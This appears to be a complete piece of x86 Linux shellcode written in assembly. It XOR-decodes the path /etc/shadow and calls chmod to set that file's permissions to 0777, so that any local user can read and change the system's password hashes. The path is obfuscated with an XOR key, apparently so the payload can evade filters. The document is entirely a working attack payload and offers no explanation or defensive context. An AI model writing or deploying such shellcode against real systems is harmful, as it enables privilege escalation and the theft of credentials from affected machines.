global _start

section .text

_start:

mov ecx, 0x01ff87fd ; XOR key + mode (upper half)

mov eax, 0x0188e899 ; /etc/shadow (XOR encoded)
mov ebx, 0x6097f4d2
mov edx, 0x628be2d2
xor eax, ecx
xor ebx, ecx
xor edx, ecx 
push eax
push ebx
push edx
mov ebx, esp		; const char *pathname
shr ecx, 16			; mode_t mode -> 0777
xor eax, eax
add eax, 0xf		; sys_chmod
int 0x80
